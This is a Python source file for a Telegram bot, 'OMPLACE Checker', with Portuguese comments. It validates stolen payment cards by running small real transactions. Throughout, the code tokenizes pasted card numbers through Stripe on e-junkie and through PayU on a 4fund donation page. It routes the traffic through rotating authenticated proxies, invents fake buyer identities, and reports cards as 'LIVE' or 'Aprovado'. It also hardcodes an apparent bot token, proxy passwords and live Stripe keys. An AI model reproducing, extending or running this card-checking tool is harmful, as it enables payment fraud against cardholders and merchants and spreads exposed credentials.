import telebot
from telebot import types
import requests
import json
import time
import re
import uuid
import random
import os
import threading
from flask import Flask, request
from urllib.parse import urlparse, parse_qs

# ==============================================================================
#  OMPLACE CHECKER - TELEGRAM BOT (WEBHOOK VERSION FOR RAILWAY)
# ==============================================================================

# --- FLASK APP ---
app = Flask(__name__)

# --- CONFIGURAÇÕES DO BOT ---
TOKEN = os.getenv("TELEGRAM_TOKEN", "8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0")
URL = os.getenv("WEBAPP_URL", "https://your-railway-url.railway.app")
bot = telebot.TeleBot(TOKEN, threaded=False)

# --- CONFIGURAÇÃO DO GRUPO OBRIGATÓRIO ---
CHANNEL_ID = "@DONATESCUENTAS" 

# --- MENSAGEM DE APOIO ---
SUPPORT_MESSAGE = """
💙 **Se este bot já te ajudou...**

Se este bot já te ajudou a conseguir contas, economizar tempo ou encontrar o que precisava, considere apoiar o desenvolvedor.

Sua contribuição ajuda a manter o bot online, adicionar novos recursos e continuar trazendo atualizações para todos.

❤️ **Apoie o desenvolvedor:** **@LIGH7YAGAMI**

📢 **Entre também no nosso grupo oficial:**
https://t.me/DONATESCUENTAS

**Toda ajuda, por menor que seja, faz a diferença. Muito obrigado pelo seu apoio!** 🚀
"""

# ==============================================================================
#  CONFIGURAÇÕES DA LOJA (STRIPE)
# ==============================================================================
LISTA_PRODUTOS = [
    "https://337212.e-junkie.com/product/1657384?custom=mkt",
]

STRIPE_PK = "pk_live_UUFYTQ63roIxScFWo9jLfco5"
STRIPE_ACC = "acct_1Rs7pfKxrOb09Lhq"

# ==============================================================================
#  CONFIGURAÇÕES VBV (PAYU)
# ==============================================================================
VBV_TARGET_URL = "https://4fund.com/3bvwxw/pay"
VBV_BANK_DOMAINS = ["emv3dsweb", "acs2web", "santander.com.br", "itau.com.br", "bradesco.com.br", "caixa.gov.br"]

# ==============================================================================
#  ROTAÇÃO DE PROXIES
# ==============================================================================
LISTA_PROXIES = [
    "31.59.20.176:6754:ryiergqn:7sqst1e51pb7",
    "31.56.127.193:7684:ryiergqn:7sqst1e51pb7",
    "45.38.107.97:6014:ryiergqn:7sqst1e51pb7",
    "198.105.121.200:6462:ryiergqn:7sqst1e51pb7",
    "64.137.96.74:6641:ryiergqn:7sqst1e51pb7",
    "198.23.243.226:6361:ryiergqn:7sqst1e51pb7",
    "38.154.185.97:6370:ryiergqn:7sqst1e51pb7",
    "84.247.60.125:6095:ryiergqn:7sqst1e51pb7",
    "142.111.67.146:5611:ryiergqn:7sqst1e51pb7",
    "191.96.254.138:6185:ryiergqn:7sqst1e51pb7",
]

PROXY_INDEX = 0

def get_proxy():
    """Retorna o próximo proxy na rotação"""
    global PROXY_INDEX
    proxy_raw = LISTA_PROXIES[PROXY_INDEX % len(LISTA_PROXIES)]
    PROXY_INDEX += 1
    parts = proxy_raw.split(':')
    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return {"http": proxy_url, "https": proxy_url}, proxy_raw

# ==============================================================================
#  INDICADORES DE APROVAÇÃO (STRIPE)
# ==============================================================================
APPROVED_INDICATORS = [
    "Your card's security code is incorrect.",
    "incorrect_cvc",
    "AuthorizeResult",
    "Approved",
    "Transaction Authorized",
    "succeeded",
    "authorized",
    "requires_capture",
    "processing",
    "pass",
    "insufficient_funds",
    "charge.succeeded",
    "stripe:success",
]

# ==============================================================================
#  FUNÇÕES AUXILIARES
# ==============================================================================
def is_user_member(user_id):
    """Verifica se o usuário está no grupo obrigatório"""
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        if status in ['creator', 'administrator', 'member']:
            return True
        return False
    except Exception as e:
        print(f"Erro ao verificar membro: {e}")
        return False

def generate_full_identity():
    first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
    last_names  = ["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"]
    domains     = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"]
    addresses = [
        {"street": "1050 S Flower St", "city": "Los Angeles", "state": "CA", "zip": "90015"},
        {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
        {"street": "1097 Howard St", "city": "San Francisco", "state": "CA", "zip": "94103"},
        {"street": "1720 2nd Ave", "city": "New York", "state": "NY", "zip": "10128"},
        {"street": "2101 4th Ave", "city": "Seattle", "state": "WA", "zip": "98121"}
    ]
    first = random.choice(first_names)
    last  = random.choice(last_names)
    addr  = random.choice(addresses)
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(domains)}"
    return {
        "first_name": first, "last_name": last, "full_name": f"{first} {last}",
        "email": email, "address": addr["street"], "city": addr["city"], 
        "state": addr["state"], "zip": addr["zip"], "phone": f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}",
        "company": f"{last} Solutions Inc.", "country": "US"
    }

def generate_vbv_identity():
    first = random.choice(["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"])
    last = random.choice(["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"])
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(['gmail.com', 'outlook.com', 'hotmail.com'])}"
    return {"full_name": f"{first} {last}", "email": email}

def extract_ids_from_url(url):
    try:
        match = re.search(r'https://(\d+)\.e-junkie\.com/product/(\d+)', url)
        if match: return match.group(1), match.group(2)
        parsed = urlparse(url)
        cl = parse_qs(parsed.query).get('cl', [None])[0]
        i = parse_qs(parsed.query).get('i', [None])[0]
        return cl, i
    except:
        return None, None


# ==============================================================================
#  CHECK_CARD - MODO STRIPE
# ==============================================================================
def check_card_stripe(card_data):
    """Verifica um cartão via Stripe (e-junkie) e retorna o resultado"""
    try:
        parts = card_data.strip().split('|')
        if len(parts) < 4:
            return f"❌ Formato inválido ➔ {card_data}"
        cc_num, cc_month, cc_year, cc_cvv = parts[0], parts[1], parts[2], parts[3]
        if len(cc_year) == 2: cc_year = "20" + cc_year
    except:
        return f"❌ Erro nos dados ➔ {card_data}"

    target_url = random.choice(LISTA_PRODUTOS)
    client_id, item_id = extract_ids_from_url(target_url)
    identity = generate_full_identity()

    proxy, proxy_raw = get_proxy()
    proxy_ip = proxy_raw.split(':')[0]

    session = requests.Session()
    session.proxies = proxy
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

    try:
        # 1. Handshake (Gera cart_id)
        init_url = f"https://www.e-junkie.com/ecom/gbv3.php?c=cart&ejc=2&cl={client_id}&i={item_id}&add=1&initialize=1"
        headers_init = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': target_url,
            'user-agent': ua
        }
        resp_init = session.get(init_url, headers=headers_init, timeout=30, proxies=proxy)

        cart_id_match = re.search(r'cart_id["\']?\s*[:=]\s*["\']?(\d+)', resp_init.text)
        cart_md5_match = re.search(r'cart_md5["\']?\s*[:=]\s*["\']?([a-f0-9]{32})', resp_init.text)

        if not cart_id_match: cart_id_match = re.search(r'cart_id=(\d+)', resp_init.url)
        if not cart_md5_match: cart_md5_match = re.search(r'cart_md5=([a-f0-9]{32})', resp_init.url)

        if not cart_id_match:
            cart_id = session.cookies.get('ej_cart_id')
            cart_md5 = session.cookies.get('ej_cart_md5')
        else:
            cart_id = cart_id_match.group(1)
            cart_md5 = cart_md5_match.group(1)

        if not cart_id:
            return f"❌ Erro Cart ID ➔ {card_data}"

        # 2. Registrar Atividade (cc_activity.php)
        referer_url = f"https://www.e-junkie.com/ecom/ccv3/?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}&initialize"
        headers_act = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.e-junkie.com',
            'referer': referer_url,
            'user-agent': ua
        }
        data_act = {
            'cart_id': cart_id, 'same_s_b': '1', 'b_email': identity['email'], 'b_name': identity['full_name'],
            'b_company': identity['company'], 'b_phone': identity['phone'], 'payment_initiated': 'false', 'save_activity': '1',
            'b_address1': identity['address'], 'b_city': identity['city'], 'b_country': identity['country'],
            'b_state': identity['state'], 'b_postcode': identity['zip']
        }
        session.post('https://www.e-junkie.com/ecom/cc_activity.php', headers=headers_act, data=data_act, timeout=15, proxies=proxy)

        # 3. Tokenização Stripe
        muid = str(uuid.uuid4())
        sid  = str(uuid.uuid4())

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua
        }
        data_stripe = {
            'type': 'card',
            'card[number]': cc_num,
            'card[cvc]': cc_cvv,
            'card[exp_month]': cc_month,
            'card[exp_year]': cc_year,
            'guid': str(uuid.uuid4()),
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; card-element',
            'key': STRIPE_PK,
            '_stripe_account': STRIPE_ACC,
        }
        resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=25, proxies=proxy)

        if resp_stripe.status_code != 200:
            err = resp_stripe.json().get('error', {}).get('message', 'Erro Stripe')
            return f"❌ Reprovado (Stripe) ➔ {card_data} ➔ {err}"

        pm_id = resp_stripe.json().get('id')

        # 4. Checkout Final (stripeValidate.php)
        headers_val = {
            'content-type': 'application/json',
            'origin': 'https://www.e-junkie.com',
            'referer': referer_url,
            'user-agent': ua
        }
        payload_val = {
            "payment_method_id": pm_id, "cart_id": cart_id, "cart_md5": cart_md5,
            "first_name": identity['first_name'], "last_name": identity['last_name'], "email": identity['email']
        }
        resp_val = session.post('https://www.e-junkie.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php', 
                                headers=headers_val, json=payload_val, timeout=35, proxies=proxy)

        try:
            resp_json = resp_val.json()
            site_msg = resp_json.get('message') or resp_json.get('error') or resp_json.get('msg') or resp_val.text[:100]
            resp_text = json.dumps(resp_json)
        except:
            site_msg = resp_val.text[:100]
            resp_text = resp_val.text

        if any(ind.lower() in resp_text.lower() for ind in APPROVED_INDICATORS):
            return f"✅ Aprovado! ➔ {card_data} ➔ {site_msg}"
        else:
            return f"❌ Reprovado ➔ {card_data} ➔ {site_msg}"

    except Exception as e:
        return f"⚠️ Erro de Conexão ➔ {card_data} ➔ {str(e)}"


# ==============================================================================
#  CHECK_CARD - MODO VBV (PAYU)
# ==============================================================================
def check_card_vbv(card_data):
    """Verifica um cartão via VBV/PayU (4fund) e retorna o resultado"""
    try:
        parts = card_data.strip().split("|")
        if len(parts) < 4:
            return f"❌ Formato inválido ➔ {card_data}"
        cc_num, cc_month, cc_year, cc_cvv = parts[0], parts[1], parts[2], parts[3]
        if len(cc_year) == 2: cc_year = "20" + cc_year
    except:
        return f"❌ Erro nos dados ➔ {card_data}"

    identity = generate_vbv_identity()
    proxy, proxy_raw = get_proxy()
    proxy_ip = proxy_raw.split(':')[0]

    try:
        session = requests.Session()
        session.proxies = proxy

        # 1. Tokenização PayU
        headers_token = {
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'referer': 'https://secure.payu.com/front/secure-form/ring/',
        }
        payload_token = {
            "posId": "4297518",
            "type": "SINGLE",
            "card": {"number": cc_num, "expirationMonth": cc_month, "expirationYear": cc_year, "cvv": cc_cvv}
        }
        
        resp_token = session.post('https://secure.payu.com/api/front/tokens', headers=headers_token, json=payload_token, timeout=20)
        
        if resp_token.status_code != 200:
            return f"❌ DECLINED ➔ {cc_num} | Erro Token"

        payu_token = resp_token.json().get('value')
        if not payu_token:
            return f"❌ DECLINED ➔ {cc_num} | Falha Token"

        # 2. Start Payment 4fund
        campaign_id = re.search(r'4fund.com/([^/]+)', VBV_TARGET_URL).group(1) if "4fund.com" in VBV_TARGET_URL else "3bvwxw"
        
        headers_pay = {
            'origin': 'https://4fund.com',
            'referer': VBV_TARGET_URL,
            'x-requested-with': 'XMLHttpRequest',
            'x-zrzutka-accept-language': 'en',
            'accept': 'application/json, text/plain, */*',
        }
        
        data = {
            "id": str(uuid.uuid4()),
            "amount": "2",
            "method": "onlineSingle",
            "externalProviderCode": payu_token,
            "donationAmount": "0.4",
            "showDataOnList": "true",
            "showAmountOnList": "true",
            "messageToOrganizer": "",
            "contributor[email]": identity['email'],
            "contributor[name]": identity['full_name'],
            "externalTerminalName": "payu_main",
            "externalProviderSpecificMethod": "card_single"
        }
        
        resp_pay = session.post(
            f'https://4fund.com/api/v2/chips/{campaign_id}/startPayment', 
            headers=headers_pay, 
            data=data, 
            timeout=30,
            allow_redirects=True
        )
        
        res_json = {}
        try:
            res_json = resp_pay.json()
            continue_url = res_json.get('continueUrl', '')
        except:
            continue_url = ''

        all_urls = [r.url for r in resp_pay.history] + [resp_pay.url]
        final_url = resp_pay.url
        
        resp_final = None
        if continue_url:
            try:
                resp_final = session.get(continue_url, timeout=30, allow_redirects=True)
                final_url = resp_final.url
                all_urls += [r.url for r in resp_final.history] + [resp_final.url]
            except:
                pass

        time.sleep(5)

        is_approved = False
        page_content = ""
        try:
            page_content = resp_final.text if resp_final else resp_pay.text
        except:
            pass

        # Lógica de detecção
        if "statusCode=SUCCESS" in final_url and "/waiting" not in final_url:
            is_approved = True
        elif "/waiting" in final_url and "statusCode=SUCCESS" in final_url:
            is_approved = False
        else:
            has_bank_in_history = any(any(domain in url for domain in VBV_BANK_DOMAINS) for url in all_urls)
            has_bank_in_content = any(domain in page_content for domain in VBV_BANK_DOMAINS)
            
            if "secure.payu.com" in final_url and "threeds" in final_url:
                if ("3D Secure 2" in page_content or "threeds" in page_content.lower()) and (has_bank_in_history or has_bank_in_content):
                    is_approved = True
                else:
                    is_approved = False
            
            elif any(domain in final_url for domain in VBV_BANK_DOMAINS):
                is_approved = True
            
            else:
                is_approved = False

        if is_approved:
            return f"✅ LIVE ➔ {cc_num}"
        else:
            return f"❌ DECLINED ➔ {cc_num}"

    except Exception as e:
        return f"⚠️ PROXY ERROR ➔ {cc_num} ➔ {str(e)}"


# ==============================================================================
#  PROCESSA CARTÕES EM BACKGROUND (THREAD)
# ==============================================================================
def process_stripe_background(chat_id, message_id, cards, initial_msg_id):
    """Processa cartões Stripe em background e edita a mensagem"""
    results = []
    for i, card in enumerate(cards):
        if not card.strip(): continue
        res = check_card_stripe(card)
        results.append(f"💳 `{card.strip()}`\nResult: {res}")
        
        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
            full_res = "📊 **Resultados (STRIPE):**\n\n" + "\n\n".join(results)
            try:
                bot.edit_message_text(full_res, chat_id, initial_msg_id, parse_mode="Markdown")
            except:
                pass
        time.sleep(2)

def process_vbv_background(chat_id, message_id, cards, initial_msg_id):
    """Processa cartões VBV em background e edita a mensagem"""
    results = []
    for i, card in enumerate(cards):
        if not card.strip(): continue
        res = check_card_vbv(card)
        results.append(f"💳 `{card.strip()}`\nResult: {res}")
        
        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
            full_res = "📊 **Resultados (VBV/PayU):**\n\n" + "\n\n".join(results)
            try:
                bot.edit_message_text(full_res, chat_id, initial_msg_id, parse_mode="Markdown")
            except:
                pass
        time.sleep(2)


# ==============================================================================
#  HANDLERS DO TELEGRAM BOT (WEBHOOK)
# ==============================================================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_user_member(message.from_user.id):
        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        return
    bot.reply_to(message, 
        "🚀 **Bot OMPLACE Online!**\n\n"
        "📋 **Comandos disponíveis:**\n\n"
        "`/stripe` — Checagem via Stripe (e-junkie)\n"
        "`/vbv` — Checagem via VBV/PayU (4fund)\n\n"
        "**Formato:** `NUMERO|MES|ANO|CVC` (um por linha)", 
        parse_mode="Markdown")

@bot.message_handler(commands=['stripe'])
def stripe_cards(message):
    if not is_user_member(message.from_user.id):
        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        return

    msg_text = message.text.replace('/stripe', '').strip()
    if not msg_text:
        bot.reply_to(message, "❌ Use: `/stripe NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
        return

    cards = msg_text.split('\n')
    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões via **Stripe**...", parse_mode="Markdown")
    
    # Processa em background para não bloquear o webhook
    thread = threading.Thread(
        target=process_stripe_background,
        args=(message.chat.id, message.message_id, cards, status_msg.message_id)
    )
    thread.start()

@bot.message_handler(commands=['vbv'])
def vbv_cards(message):
    if not is_user_member(message.from_user.id):
        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        return

    msg_text = message.text.replace('/vbv', '').strip()
    if not msg_text:
        bot.reply_to(message, "❌ Use: `/vbv NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
        return

    cards = msg_text.split('\n')
    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões via **VBV/PayU**...", parse_mode="Markdown")
    
    # Processa em background para não bloquear o webhook
    thread = threading.Thread(
        target=process_vbv_background,
        args=(message.chat.id, message.message_id, cards, status_msg.message_id)
    )
    thread.start()

@bot.message_handler(commands=['chk'])
def chk_cards(message):
    """Compatibilidade com /chk — usa Stripe por padrão"""
    msg_text = message.text.replace('/chk', '').strip()
    message.text = f"/stripe {msg_text}"
    stripe_cards(message)

@bot.message_handler(func=lambda message: True)
def auto_chk(message):
    if '|' in message.text:
        if not is_user_member(message.from_user.id):
            bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
            return
        # Auto-chk usa Stripe por padrão
        msg_text = message.text
        message.text = f"/stripe {msg_text}"
        stripe_cards(message)


# ==============================================================================
#  FLASK WEBHOOK ROUTE
# ==============================================================================
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    update = types.Update.de_json(request.stream.read().decode("utf-8"), bot)
    bot.process_new_updates([update])
    return '', 200

@app.route('/')
def health():
    return "Bot OMPLACE Online 🚀"


# ==============================================================================
#  MAIN
# ==============================================================================
if __name__ == "__main__":
    # Deleta webhook anterior (caso exista) e configura novo
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=f"{URL}/{TOKEN}")
    print("Bot iniciado com webhook em Railway...")
    print(f"Webhook URL: {URL}/{TOKEN}")
    
    # Roda Flask para receber webhooks
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
